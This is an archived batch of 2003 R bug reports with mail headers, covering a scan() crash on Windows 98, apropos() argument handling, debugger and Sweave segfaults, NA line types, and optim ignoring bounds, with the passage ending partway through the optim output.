X-Spam-Checker-Version: SpamAssassin 2.54 (1.174.2.17-2003-05-11-exp)

# Your mailer is set to "none" (default on Windows),
# hence we cannot send the bug report directly from R.
# Please copy the bug report (after finishing it) to
# your favorite email program and send it to
#
#       r-bugs@r-project.org
#
######################################################



scan() (and so also of course read.table, read.csv etc) crashes right
out of
R (GUI)
if it encounters non-ASCII characters (my particular example was a
superscript 2
which is OK in MS applications (even in Notepad this is OK: BMI*
(kg/m²)).

For example

read.csv("d:\\table03.csv",colClasses="character")

generates

"This program has performed an illegal operation and will be shut down
..."

and the details says

RGUI caused an invalid page fault in
module R.DLL at 0167:004f3b67.
Registers:
EAX=0098007a CS=0167 EIP=004f3b67 EFLGS=00010246
EBX=01d97e92 SS=016f ESP=0096e140 EBP=0096e158
ECX=ffffffb2 DS=016f ESI=0000000a FS=3baf
EDX=01fbd5b2 ES=016f EDI=00000000 GS=0000
Bytes at CS:EIP:
66 8b 04 48 25 57 01 00 00 25 ff ff 00 00 eb 9f 
Stack dump:
000c0000 00000001 00966000 00000013 0000000b 00000000 0096e188 0048dd2f
01d97e88 00000000 01fbd5cc 01fbd5cc 000c0000 00000004 0000000d 00000001 

which certainly meeans nothing at all to me!

Simon Fear


--please do not edit the information below--

Version:
 platform = i386-pc-mingw32
 arch = i386
 os = mingw32
 system = i386, mingw32
 status = 
 major = 1
 minor = 7.0
 year = 2003
 month = 04
 day = 16
 language = R

Windows 98 SE 4.10 (build 2222)  A 

Search Path:
 .GlobalEnv, package:methods, package:ctest, package:mva,
package:modreg,
package:nls, package:ts, Autoloads, package:base
 

Simon Fear
Senior Statistician
Syne qua non Ltd
Tel: +44 (0) 1379 644449
Fax: +44 (0) 1379 644445
email: Simon.Fear@synequanon.com
web: http://www.synequanon.com
 
Number of attachments included with this message: 0
 
This message (and any associated files) is confidential and 
contains information which may be legally privileged.  It is 
intended for the stated addressee(s) only.  Access to this 
email by anyone else is unauthorised.  If you are not the 
intended addressee, any action taken (or not taken) in 
reliance on it, or any disclosure or copying of the contents of 
it is unauthorised and unlawful.  If you are not the addressee, 
please inform the sender immediately and delete the email 
from your system.

This message and any associated attachments have been 
checked for viruses using an internationally recognised virus 
detection process.  However, Internet communications cannot 
be guaranteed to be secure or error-free as information could 
be intercepted, corrupted, lost, destroyed, arrive late or 
incomplete. Therefore, we do not accept responsibility for any 
errors or omissions that are present in this message, or any 
attachment, that have arisen as a result of e-mail transmission.  
If verification is required, please request a hard-copy version. 
Any views or opinions presented are solely those of the author 
and do not necessarily represent those of Syne qua non.


==> 3234.followup.1 <==
From ligges@amadeus.statistik.uni-dortmund.de Thu Jun 12 08:32:32 2003
Received: from nx5.hrz.uni-dortmund.de (nx5.HRZ.Uni-Dortmund.DE [129.217.131.21])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h5C6WV2b024865
	for <R-bugs@biostat.ku.dk>; Thu, 12 Jun 2003 08:32:32 +0200 (MET DST)
Received: from amadeus.statistik.uni-dortmund.de (Amadeus.Statistik.Uni-Dortmund.DE [129.217.206.1])
	by nx5.hrz.uni-dortmund.de (Postfix) with ESMTP
	id 52CE44AAC3E; Thu, 12 Jun 2003 08:32:32 +0200 (MET DST)
Received: from statistik.uni-dortmund.de ([129.217.207.201])
	by amadeus.statistik.uni-dortmund.de (8.11.6+Sun/8.11.6) with ESMTP id h5C6WWv10079;
	Thu, 12 Jun 2003 08:32:32 +0200 (MET DST)
Message-ID: <3EE81E92.4010705@statistik.uni-dortmund.de>
Date: Thu, 12 Jun 2003 08:32:50 +0200
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
Organization: Fachbereich Statistik, Universitaet Dortmund
User-Agent: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.4) Gecko/20030529
X-Accept-Language: en-us, en, de-de, de
MIME-Version: 1.0
To: Simon.Fear@synequanon.com
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] scan() crash in Windows 98 (PR#3234)
References: <200306111110.h5BBA42b018129@pubhealth.ku.dk>
In-Reply-To: <200306111110.h5BBA42b018129@pubhealth.ku.dk>
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Simon.Fear@synequanon.com wrote:

> # Your mailer is set to "none" (default on Windows),
> # hence we cannot send the bug report directly from R.
> # Please copy the bug report (after finishing it) to
> # your favorite email program and send it to
> #
> #       r-bugs@r-project.org
> #
> ######################################################
> 
> 
> 
> scan() (and so also of course read.table, read.csv etc) crashes right
> out of
> R (GUI)
> if it encounters non-ASCII characters (my particular example was a
> superscript 2
> which is OK in MS applications (even in Notepad this is OK: BMI*
> (kg/m?)).

... and also OK in R (patched) for non-DOS-based Microsoft Operating 
Systems, like WinNT 4.0, hence difficult to debug
(unless Duncan has still a Win9x machine running?).

Uwe Ligges


> For example
> 
> read.csv("d:\\table03.csv",colClasses="character")
> 
> generates
> 
> "This program has performed an illegal operation and will be shut down
> ..."
> 
> and the details says
> 
> RGUI caused an invalid page fault in
> module R.DLL at 0167:004f3b67.
> Registers:
> EAX=0098007a CS=0167 EIP=004f3b67 EFLGS=00010246
> EBX=01d97e92 SS=016f ESP=0096e140 EBP=0096e158
> ECX=ffffffb2 DS=016f ESI=0000000a FS=3baf
> EDX=01fbd5b2 ES=016f EDI=00000000 GS=0000
> Bytes at CS:EIP:
> 66 8b 04 48 25 57 01 00 00 25 ff ff 00 00 eb 9f 
> Stack dump:
> 000c0000 00000001 00966000 00000013 0000000b 00000000 0096e188 0048dd2f
> 01d97e88 00000000 01fbd5cc 01fbd5cc 000c0000 00000004 0000000d 00000001 
> 
> which certainly meeans nothing at all to me!
> 
> Simon Fear
> 
> 
> --please do not edit the information below--
> 
> Version:
>  platform = i386-pc-mingw32
>  arch = i386
>  os = mingw32
>  system = i386, mingw32
>  status = 
>  major = 1
>  minor = 7.0
>  year = 2003
>  month = 04
>  day = 16
>  language = R
> 
> Windows 98 SE 4.10 (build 2222)  A 
> 
> Search Path:
>  .GlobalEnv, package:methods, package:ctest, package:mva,
> package:modreg,
> package:nls, package:ts, Autoloads, package:base
>  
> 
> Simon Fear
> Senior Statistician
> Syne qua non Ltd
> Tel: +44 (0) 1379 644449
> Fax: +44 (0) 1379 644445
> email: Simon.Fear@synequanon.com
> web: http://www.synequanon.com
>  
> Number of attachments included with this message: 0
>  
> This message (and any associated files) is confidential and 
> contains information which may be legally privileged.  It is 
> intended for the stated addressee(s) only.  Access to this 
> email by anyone else is unauthorised.  If you are not the 
> intended addressee, any action taken (or not taken) in 
> reliance on it, or any disclosure or copying of the contents of 
> it is unauthorised and unlawful.  If you are not the addressee, 
> please inform the sender immediately and delete the email 
> from your system.
> 
> This message and any associated attachments have been 
> checked for viruses using an internationally recognised virus 
> detection process.  However, Internet communications cannot 
> be guaranteed to be secure or error-free as information could 
> be intercepted, corrupted, lost, destroyed, arrive late or 
> incomplete. Therefore, we do not accept responsibility for any 
> errors or omissions that are present in this message, or any 
> attachment, that have arisen as a result of e-mail transmission.  
> If verification is required, please request a hard-copy version. 
> Any views or opinions presented are solely those of the author 
> and do not necessarily represent those of Syne qua non.
> 
> ______________________________________________
> R-devel@stat.math.ethz.ch mailing list
> https://www.stat.math.ethz.ch/mailman/listinfo/r-devel



==> 3234.audit <==
Thu Jun 12 09:51:18 2003	ripley	changed notes
Thu Jun 12 09:51:18 2003	ripley	foobar
Thu Jun 12 09:51:18 2003	ripley	moved from incoming to Windows
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  incoming

* PR# 2461 *
Subject: apropos() with partial name
From: John Maindonald <u9801539@leonard.anu.edu.au>
Date: Thu, 16 Jan 2003 20:22:23 +1100 (EST)
--The proposed fix would make it impossible to pass a variable to apropos
--
--eg 
--
--> sor<-"plot"
--> apropos(sor)
--[1] "sor"          "isoreg"       "sortedXyData" "is.unsorted"  "sort"        
--[6] "sort.list"   
--
--A better fix might be to require the argument to be a string.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2461 <==
From mailnull@stat.math.ethz.ch  Thu Jan 16 10:24:15 2003
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA06747
	for <R-bugs@biostat.ku.dk>; Thu, 16 Jan 2003 10:24:15 +0100 (MET)
Received: from hypatia.math.ethz.ch (mailnull@localhost [127.0.0.1])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with ESMTP id h0G9NPWH023987
	(version=TLSv1/SSLv3 cipher=EDH-RSA-DES-CBC3-SHA bits=168 verify=NO)
	for <R-bugs@biostat.ku.dk>; Thu, 16 Jan 2003 10:23:25 +0100 (MET)
Received: (from mailnull@localhost)
	by hypatia.math.ethz.ch (8.12.6/8.12.6/Submit) id h0G9NOIR023986
	for R-bugs@biostat.ku.dk; Thu, 16 Jan 2003 10:23:24 +0100 (MET)
Received: from franz.stat.wisc.edu (mail@www.omegahat.org [128.105.174.32])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with ESMTP id h0G9NIWG023970
	for <r-bugs@lists.r-project.org>; Thu, 16 Jan 2003 10:23:20 +0100 (MET)
Received: from anumail4.anu.edu.au ([150.203.2.44] helo=anu.edu.au)
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 18Z6F1-0007Qm-00
	for <r-bugs@r-project.org>; Thu, 16 Jan 2003 03:23:15 -0600
Received: from leonard.anu.edu.au (leonard.anu.edu.au [150.203.2.15])
	by anu.edu.au (8.12.4/8.12.4) with ESMTP id h0G9McBo004500
	for <r-bugs@r-project.org>; Thu, 16 Jan 2003 20:23:03 +1100 (EST)
Received: (from u9801539@localhost)
	by leonard.anu.edu.au (8.11.6/8.11.6) id h0G9MNS14796
	for r-bugs@r-project.org; Thu, 16 Jan 2003 20:22:23 +1100 (EST)
Date: Thu, 16 Jan 2003 20:22:23 +1100 (EST)
From: John Maindonald <u9801539@leonard.anu.edu.au>
Message-Id: <200301160922.h0G9MNS14796@leonard.anu.edu.au>
To: r-bugs@r-project.org
Subject: apropos() with partial name
X-Sender: u9801539@leonard.anu.edu.au
X-Sender-Domain: leonard.anu.edu.au
X-Spam-Score: (0.4)
X-Spam-Tests: FROM_ENDS_IN_NUMS
X-Scanned-By: MIMEDefang 2.15 (www dot roaringpenguin dot com slash mimedefang)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Spam-Status: No, hits=1.7 required=5.0
	tests=FROM_ENDS_IN_NUMS,SPAM_PHRASE_00_01
	version=2.43
X-Spam-Level: *

> apropos(sort)
[1] "is.unsorted" "sort"        "sort.list"  
> apropos(sor)
Error in apropos(sor) : Object "sor" not found
> sor <- 0
> apropos(sor)
[1] "sor"         "is.unsorted" "sort"        "sort.list"  

Thus the behaviour of apropos() can depend on what objects
are in the workspace, which is surely not intended!

There are some weird consequences:
apropos(b) generates an error, while apropos(c) finds a
huge number of partial matches.

The problem is with the first line of the function, i.e.,
    if (!is.character(what)) 
        what <- as.character(substitute(what))

I suggest replacing this with:
    if (!is.character(substitute(what))) 
        what <- as.character(substitute(what))

apropos("sor") works fine.

I have checked this also on Darwin/X11, version 1.6.1

--please do not edit the information below--

Version:
 platform = i386-pc-mingw32
 arch = i386
 os = mingw32
 system = i386, mingw32
 status = 
 major = 1
 minor = 6.2
 year = 2003
 month = 01
 day = 10
 language = R

Windows XP Home Edition (build 2600) Service Pack 1.0

Search Path:
 .GlobalEnv, package:DAAG, package:ctest, Autoloads, package:base
John Maindonald                     email : john.maindonald@anu.edu.au
Centre for Bioinformation Science,  phone : (6125)3473        
c/o MSI,                            fax   : (6125)5549 
John Dedman Mathematical Sciences Building (Building 27)
Australian National University
Canberra ACT 0200
Australia


==> 2461.audit <==
Fri Apr 11 19:06:24 2003	thomas	changed notes
Fri Apr 11 19:06:24 2003	thomas	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2656 *
Subject: recursive default argument reference in debugger
From: pburns@pburns.seanet.com
Date: Wed, 19 Mar 2003 12:23:40 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2656 <==
From pburns@pburns.seanet.com Wed Mar 19 12:23:41 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.8/8.12.8) with ESMTP id h2JBNen9026099
	for <R-bugs@biostat.ku.dk>; Wed, 19 Mar 2003 12:23:41 +0100 (MET)
Date: Wed, 19 Mar 2003 12:23:40 +0100 (MET)
Message-Id: <200303191123.h2JBNen9026099@pubhealth.ku.dk>
From: pburns@pburns.seanet.com
To: R-bugs@biostat.ku.dk
Subject: recursive default argument reference in debugger

Full_Name: Patrick Burns
Version: 1.6.1
OS: Linux
Submission from: (NULL) (217.35.44.203)


# the setup

 fjj.bd <-
function (x, y=x$b[, c("lower", "upper"), drop=FALSE])
{
        y
}

jjb0 <- list(b=array(1:3, c(1, 3), list("A", c("", "", "C"))))

options(error=dump.frames)

# creating the problem

> fjj.bd(jjb0)
Error in fjj.bd(jjb0) : subscript out of bounds
> debugger()
Message:  Error in fjj.bd(jjb0) : subscript out of bounds
Available environments had calls:
1: fjj.bd(jjb0)

Enter an environment number, or 0 to exit  Selection: 1
Error in get(.obj, envir = dump[[.selection]]) : 
        recursive default argument reference


The problem is that "debugger" gets an error when trying to
go into the dump.  I don't understand what is going on, but
it doesn't have to do with the actual names of the objects --
the same thing happens if all the names are changed.

This is precisely the same on Linux with 1.6.1 and Windows
with 1.6.2.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2809 *
Subject: sweave provoked segfault
From: Paul Gilbert <pgilbert@bank-banque-canada.ca>
Date: Mon, 21 Apr 2003 17:01:53 -0400
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2809 <==
From pgilbert@bank-banque-canada.ca Mon Apr 21 23:03:38 2003
Received: from mail1.bank-banque-canada.ca (mail1.bank-banque-canada.ca [140.80.193.130])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h3LL3apD003887
	for <r-bugs@biostat.ku.dk>; Mon, 21 Apr 2003 23:03:36 +0200 (MET DST)
Received: from fwx-i1.bank-banque-canada.ca (fwx-int.bank-banque-canada.ca [140.80.193.129])
	by mail1.bank-banque-canada.ca (8.9.3/8.9.3) with SMTP id RAA05365
	for <r-bugs@biostat.ku.dk>; Mon, 21 Apr 2003 17:02:30 -0400 (EDT)
Received: from  ([140.80.2.219]) by fwx-i1; Mon, 21 Apr 2003 16:59:37 -0400 (EDT)
Received: from asd98620.boc by mailhost.bank-banque-canada.ca (8.8.8+Sun/SMI-SVR4)
	id RAA19461; Mon, 21 Apr 2003 17:02:22 -0400 (EDT)
Received: from bank-banque-canada.ca ([140.80.210.108])
	by asd98620.boc (8.8.8+Sun/8.8.8) with ESMTP id RAA16811;
	Mon, 21 Apr 2003 17:04:21 -0400 (EDT)
Message-ID: <3EA45C41.F316490D@bank-banque-canada.ca>
Date: Mon, 21 Apr 2003 17:01:53 -0400
From: Paul Gilbert <pgilbert@bank-banque-canada.ca>
X-Mailer: Mozilla 4.7 [en] (Win98; U)
X-Accept-Language: en
MIME-Version: 1.0
To: "r-bugs@biostat.ku.dk" <r-bugs@biostat.ku.dk>
Subject: sweave provoked segfault
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

This problem is with R 1.7.0 (as released) on Linux and Solaris. Details below
are from Linux, Mandrake 9.1. The problem also happened with R 1.6.2 and on
Mandrake 9.0.

Vignettes often (for me) provokes problems with the misleading error message:

* creating vignettes ... ERROR
Error in sub(pattern, replacement, x, ignore.case, extended) :
        invalid argument
Error in buildVignettes(dir = ".") : Error in sub(pattern, replacement,
x, ignore.case, extended) :
        invalid argument
Execution halted

This becomes a segfault with gctorture(). Output from gdb bt is copied below.

Paul Gilbert
________
R_LIBS=/home/paul/dse/src/pac/monitor/tmp.R-1.7.0:/home/paul/dse/src/pac/CHECKED.R-1.7.0/Rlibs 
PADI=/home/paul/dse/src/pac/padi/exec
PATH=~/bin:/bin:/usr/bin:/usr/local/bin:/usr/X11R6/bin:/usr/games:/home/paul/dse/src/pac/padi/exec
R -d gdb
GNU gdb 5.3-22mdk (Mandrake Linux)
Copyright 2002 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you
are
welcome to change it and/or distribute copies of it under certain
conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for
details.
This GDB was configured as "i586-mandrake-linux-gnu"...
(gdb) run
Starting program: /home/paul/toolchain/R/R-1.7.0/bin/R.bin
 
R : Copyright 2003, The R Development Core Team
Version 1.7.0  (2003-04-16)
 
R is free software and comes with ABSOLUTELY NO WARRANTY.
You are welcome to redistribute it under certain conditions.
Type `license()' or `licence()' for distribution details.
 
R is a collaborative project with many contributors.
Type `contributors()' for more information.
 
Type `demo()' for some demos, `help()' for on-line help, or
`help.start()' for a HTML browser interface to help.
Type `q()' to quit R.
 
 library(tools)
> >  library(tools)
> gctorture()
> checkVignettes(dir='/home/paul/dse/src/pac/monitor', workdir = 'cur',
keepfiles=TRUE)
 
Program received signal SIGSEGV, Segmentation fault.
0x080c1598 in RunGenCollect (size_needed=0) at memory.c:1210
1210        PROCESS_NODES();
(gdb) bt
#0  0x080c1598 in RunGenCollect (size_needed=0) at memory.c:1210
#1  0x080c3089 in R_gc_internal (size_needed=0) at memory.c:1865
#2  0x080c27fe in Rf_cons (car=0xbfffbf40, cdr=0x81f65a0) at
memory.c:1534
#3  0x08097e35 in Rf_duplicate (s=0x8324ff0) at duplicate.c:108
#4  0x080c9abf in GetObject (cptr=0xbfffc2d0) at objects.c:40
#5  0x080ca663 in do_usemethod (call=0x82c5d28, op=0x8209874,
args=0x82c5d44,
    env=0x8f1ecd4) at objects.c:401
#6  0x080a3b28 in Rf_eval (e=0x82c5d28, rho=0x8f1ecd4) at eval.c:418
#7  0x080a3db2 in Rf_applyClosure (call=0x8324ff0, op=0x82c5c48,
    arglist=0x8d05e80, rho=0x8f385f0, suppliedenv=0x81f65a0) at
eval.c:609
#8  0x080a3937 in Rf_eval (e=0x8324ff0, rho=0x8f385f0) at eval.c:453
#9  0x080a586b in Rf_evalList (el=0x8324f9c, rho=0x8f385f0) at
eval.c:1372
#10 0x080c9a3c in do_internal (call=0x8324ef4, op=0x81fb5c8,
args=0x832515c,
    env=0x8f385f0) at names.c:1053
#11 0x080a3b28 in Rf_eval (e=0x8324ef4, rho=0x8f385f0) at eval.c:418
#12 0x080a3db2 in Rf_applyClosure (call=0x878ef30, op=0x8324e14,
    arglist=0x8dbc92c, rho=0x8f0bb0c, suppliedenv=0x81f65a0) at
eval.c:609
#13 0x080a3937 in Rf_eval (e=0x878ef30, rho=0x8f0bb0c) at eval.c:453
#14 0x080a5685 in do_set (call=0x878efd8, op=0x8f0bb0c, args=0x878efa0,
    rho=0x8f0bb0c) at eval.c:1283
#15 0x080a3b28 in Rf_eval (e=0x878efd8, rho=0x8f0bb0c) at eval.c:418
#16 0x080a4f62 in do_begin (call=0x878f4ec, op=0x81fba7c,
args=0x878eff4,
    rho=0x8f0bb0c) at eval.c:1072
---Type <return> to continue, or q <return> to quit---
#17 0x080a3b28 in Rf_eval (e=0x878f4ec, rho=0x8f0bb0c) at eval.c:418
#18 0x080a3db2 in Rf_applyClosure (call=0x87a0758, op=0x86d817c,
    arglist=0x8f0e3dc, rho=0x8f37ed4, suppliedenv=0x81f65a0) at
eval.c:609
#19 0x080a3937 in Rf_eval (e=0x87a0758, rho=0x8f37ed4) at eval.c:453
#20 0x080a5685 in do_set (call=0x87a07e4, op=0x8f37ed4, args=0x87a07c8,
    rho=0x8f37ed4) at eval.c:1283
#21 0x080a3b28 in Rf_eval (e=0x87a07e4, rho=0x8f37ed4) at eval.c:418
#22 0x080a4f62 in do_begin (call=0x87a0aac, op=0x81fba7c,
args=0x87a08c4,
    rho=0x8f37ed4) at eval.c:1072
#23 0x080a3b28 in Rf_eval (e=0x87a0aac, rho=0x8f37ed4) at eval.c:418
#24 0x080a3b28 in Rf_eval (e=0x879b778, rho=0x8f37ed4) at eval.c:418
#25 0x080a3b28 in Rf_eval (e=0x879b970, rho=0x8f37ed4) at eval.c:418
#26 0x080a4f62 in do_begin (call=0x879b98c, op=0x81fba7c,
args=0x879b9e0,
    rho=0x8f37ed4) at eval.c:1072
#27 0x080a3b28 in Rf_eval (e=0x879b98c, rho=0x8f37ed4) at eval.c:418
#28 0x080a495c in do_for (call=0x879ba6c, op=0x81f5f80, args=0x879ba50,
    rho=0x8f37ed4) at eval.c:968
#29 0x080a3b28 in Rf_eval (e=0x879ba6c, rho=0x8f37ed4) at eval.c:418
#30 0x080a4f62 in do_begin (call=0x87a8554, op=0x81fba7c,
args=0x879baa4,
    rho=0x8f37ed4) at eval.c:1072
#31 0x080a3b28 in Rf_eval (e=0x87a8554, rho=0x8f37ed4) at eval.c:418
#32 0x080a3db2 in Rf_applyClosure (call=0x8721b18, op=0x86e693c,
    arglist=0x8f37fd0, rho=0x8f38e74, suppliedenv=0x81f65a0) at
eval.c:609
---Type <return> to continue, or q <return> to quit---
#33 0x080a3937 in Rf_eval (e=0x8721b18, rho=0x8f38e74) at eval.c:453
#34 0x080a3856 in Rf_eval (e=0x8f37ef0, rho=0x8f38cfc) at eval.c:383
#35 0x080a379f in Rf_eval (e=0x826fbf8, rho=0x8f38cfc) at eval.c:360
#36 0x080a4f62 in do_begin (call=0x87d4f44, op=0x81fba7c,
args=0x87d4e9c,
    rho=0x8f38cfc) at eval.c:1072
#37 0x080a3b28 in Rf_eval (e=0x87d4f44, rho=0x8f38cfc) at eval.c:418
#38 0x080a3b28 in Rf_eval (e=0x87d5b3c, rho=0x8f38cfc) at eval.c:418
#39 0x080a4f62 in do_begin (call=0x87d5484, op=0x81fba7c,
args=0x87d5b20,
    rho=0x8f38cfc) at eval.c:1072
#40 0x080a3b28 in Rf_eval (e=0x87d5484, rho=0x8f38cfc) at eval.c:418
#41 0x080a3db2 in Rf_applyClosure (call=0x8721bf8, op=0x87d5a40,
    arglist=0x8f37f0c, rho=0x8f38e74, suppliedenv=0x81f65a0) at
eval.c:609
#42 0x080a3937 in Rf_eval (e=0x8721bf8, rho=0x8f38e74) at eval.c:453
#43 0x080a5685 in do_set (call=0x8721c68, op=0x8f38e74, args=0x8721c4c,
    rho=0x8f38e74) at eval.c:1283
#44 0x080a3b28 in Rf_eval (e=0x8721c68, rho=0x8f38e74) at eval.c:418
#45 0x080a4f62 in do_begin (call=0x8721c84, op=0x81fba7c,
args=0x8721d48,
    rho=0x8f38e74) at eval.c:1072
#46 0x080a3b28 in Rf_eval (e=0x8721c84, rho=0x8f38e74) at eval.c:418
#47 0x080a3b28 in Rf_eval (e=0x87214d0, rho=0x8f38e74) at eval.c:418
#48 0x080a4f62 in do_begin (call=0x8722908, op=0x81fba7c,
args=0x8721540,
    rho=0x8f38e74) at eval.c:1072
#49 0x080a3b28 in Rf_eval (e=0x8722908, rho=0x8f38e74) at eval.c:418
---Type <return> to continue, or q <return> to quit---
#50 0x080a495c in do_for (call=0x8721604, op=0x81f5f80, args=0x87215cc,
    rho=0x8f38e74) at eval.c:968
#51 0x080a3b28 in Rf_eval (e=0x8721604, rho=0x8f38e74) at eval.c:418
#52 0x080a4f62 in do_begin (call=0x87260f8, op=0x81fba7c,
args=0x8721620,
    rho=0x8f38e74) at eval.c:1072
#53 0x080a3b28 in Rf_eval (e=0x87260f8, rho=0x8f38e74) at eval.c:418
#54 0x080a3db2 in Rf_applyClosure (call=0x8f38ec8, op=0x86cd644,
    arglist=0x8f38f38, rho=0x820ce1c, suppliedenv=0x81f65a0) at
eval.c:609
#55 0x080a3937 in Rf_eval (e=0x8f38ec8, rho=0x820ce1c) at eval.c:453
#56 0x080bd784 in Rf_ReplIteration (rho=0x820ce1c, savestack=16,
    browselevel=0, state=0xbffff0f0) at main.c:236
#57 0x080bd942 in R_ReplConsole (rho=0x820ce1c, savestack=0,
browselevel=0)
    at main.c:284
#58 0x080be1ff in run_Rmainloop () at main.c:615
#59 0x08124b5c in main (ac=1, av=0xbffff5c4) at system.c:99
#60 0x400977f7 in __libc_start_main () from /lib/i686/libc.so.6
(gdb)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3217 *
Subject: inconsistent handling of NA lty
From: paul@stat.auckland.ac.nz
Date: Tue, 10 Jun 2003 01:23:42 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3217 <==
From paul@stat.auckland.ac.nz Tue Jun 10 01:23:43 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h59NNg2b001926
	for <R-bugs@biostat.ku.dk>; Tue, 10 Jun 2003 01:23:42 +0200 (MET DST)
Date: Tue, 10 Jun 2003 01:23:42 +0200 (MET DST)
Message-Id: <200306092323.h59NNg2b001926@pubhealth.ku.dk>
From: paul@stat.auckland.ac.nz
To: R-bugs@biostat.ku.dk
Subject: inconsistent handling of NA lty

Full_Name: 
Version: 
OS: 
Submission from: (NULL) (130.216.50.118)
Submitted by: paul


From report by Peter Dalgaard ...

I found that if a numeric vector is used to set the line type in
segments(), then any NA values get plotted with a particular pattern,
rather than omitted as usually happens with NAs. Similarly, 

  plot(rnorm(5),type="l",lty=as.numeric(NA))

does plot a line, curiously enough not with the same pattern as

  plot(1:7,2:8)
  segments(1:5,2:6,4:8,3:7,lty=c(NA,1:4))

lty=NA (i.e. logical NA) gives an error.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3325 *
Subject: optim with constraints 
From: aa@tango.stat.unipd.it (Adelchi Azzalini)
Date: Mon, 23 Jun 2003 17:51:19 +0200 (CEST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3325 <==
From mailnull@stat.math.ethz.ch Mon Jun 23 17:52:57 2003
Received: from stat.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h5NFquJH026936
	for <R-bugs@biostat.ku.dk>; Mon, 23 Jun 2003 17:52:57 +0200 (MET DST)
Received: from stat.math.ethz.ch (localhost [127.0.0.1])
	by stat.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h5NFqkU3013122
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Mon, 23 Jun 2003 17:52:47 +0200 (MEST)
Received: (from mailnull@localhost)
	by stat.math.ethz.ch (8.12.9/8.12.6/Submit) id h5NFqkK2013121
	for R-bugs@biostat.ku.dk; Mon, 23 Jun 2003 17:52:46 +0200 (MEST)
Received: from franz.stat.wisc.edu (www.omegahat.org [128.105.174.32])
	by stat.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h5NFqaU2013095
	for <r-bugs@lists.r-project.org>; Mon, 23 Jun 2003 17:52:37 +0200 (MEST)
Received: from tango.stat.unipd.it ([147.162.23.130])
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 19UTck-0002jy-00
	for <r-bugs@r-project.org>; Mon, 23 Jun 2003 10:52:54 -0500
Received: by tango.stat.unipd.it (Postfix, from userid 1000)
	id B11BF7CA824; Mon, 23 Jun 2003 17:51:19 +0200 (CEST)
To: r-bugs@r-project.org
Subject: optim with constraints 
Cc: aa@tango.stat.unipd.it
Message-Id: <20030623155119.B11BF7CA824@tango.stat.unipd.it>
Date: Mon, 23 Jun 2003 17:51:19 +0200 (CEST)
From: aa@tango.stat.unipd.it (Adelchi Azzalini)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: 8bit
X-Spam-Status: No, hits=-0.9 required=5.0 tests=BAYES_30 version=2.54
X-Spam-Level: 
X-Spam-Checker-Version: SpamAssassin 2.54 (1.174.2.17-2003-05-11-exp)



The source code listed below (just before the system information) makes 
"optim" to ignore the bounds on one of the parameters; this is detected 
by the function to be optimized (sn.dev) and the program stops.  On my
computer the numeric optput which I obtain is:

sn.dev: (cp,dev)=[1] -1.3222  0.3738  0.3263 42.1824
sn.dev.gh: gradient=[1]  2.092  4.059 -4.039
sn.dev: (cp,dev)=[1]  -2.2611   0.2060   0.6266 686.3262
sn.dev.gh: gradient=[1] -1208.1 -5719.7  -287.1
sn.dev: (cp,dev)=[1] -1.3632  0.3665  0.3394 42.6260
sn.dev.gh: gradient=[1] -27.758   1.067  -4.431
sn.dev: (cp,dev)=[1] -1.3279  0.3728  0.3281 42.1705
sn.dev.gh: gradient=[1] -1.976  3.989 -4.090
sn.dev: (cp,dev)=[1] -1.3279  0.3667  0.3348 42.1461
sn.dev.gh: gradient=[1] -0.4494 -4.9931 -4.0685
sn.dev: (cp,dev)=[1] -1.3280  0.3671  0.3403 42.1219
sn.dev.gh: gradient=[1] -0.5089 -4.4250 -4.0727
sn.dev: (cp,dev)=[1] -1.3282  0.3686  0.3623 42.0268
sn.dev.gh: gradient=[1] -0.7684 -2.2082 -4.0932
sn.dev: (cp,dev)=[1] -1.3290  0.3748  0.4506 41.6734
sn.dev.gh: gradient=[1] -2.128  5.823 -4.226
sn.dev: (cp,dev)=[1]    -1.3341     0.3927     0.9953 25934.9488
